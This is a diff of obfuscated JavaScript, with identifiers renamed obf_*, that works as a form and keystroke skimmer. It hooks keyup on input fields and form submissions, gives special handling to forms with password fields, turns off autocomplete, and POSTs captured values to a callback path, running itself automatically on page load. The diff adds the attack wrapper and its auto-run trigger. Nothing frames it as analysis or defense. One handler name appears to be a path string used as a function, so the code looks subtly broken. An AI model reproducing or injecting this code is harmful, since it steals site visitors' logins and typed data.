@@ -20,7 +20,7 @@ function obf_func_callback() {
 			obf_var_req.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params, true);
 			obf_var_req.send();
 		}
-	} catch(obf_var_ignore){}
+	} catch(obf_ignore){}
 }
 
 function obf_func_whitelist() {
@@ -45,7 +45,7 @@ function obf_func_whitelist() {
 			obf_var_req.open("POST", "http://" + location.host + "/obf_path_whitelist?" + obf_var_params, true);
 			obf_var_req.send();
 		}
-	} catch(obf_var_ignore){}
+	} catch(obf_ignore){}
 }
 
 self.addEventListener("keyup", function(obf_var_event) {
@@ -53,14 +53,28 @@ self.addEventListener("keyup", function(obf_var_event) {
 		if (obf_var_event.target.tagName.match(/INPUT|TEXTAREA/)) {
 			obf_func_callback();
 		}
-	} catch(obf_var_ignore){}
+	} catch(obf_ignore){}
 });
 
-document.querySelectorAll("form").forEach(function(obf_var_form){
-	obf_var_form.addEventListener("submit", obf_func_callback);
+function obf_func_attack() {
 	document.querySelectorAll("form").forEach(function(obf_var_form){
+		obf_var_form.addEventListener("submit", obf_func_callback);
 		if (obf_var_form.querySelector("input[type=password]")) {
 			obf_var_form.addEventListener("submit", obf_path_whitelist);
 		}
 	});
-});
+
+	document.querySelectorAll("input").forEach(function(obf_var_input){
+		obf_var_input.autocomplete = "off";
+	});
+}
+
+try {
+	obf_func_attack();
+} catch(obf_ignore){
+	try {
+		document.addEventListener("DOMContentLoaded", obf_func_attack);
+	} catch(obf_ignore){
+		self.addEventListener("load", obf_func_attack);
+	}
+}
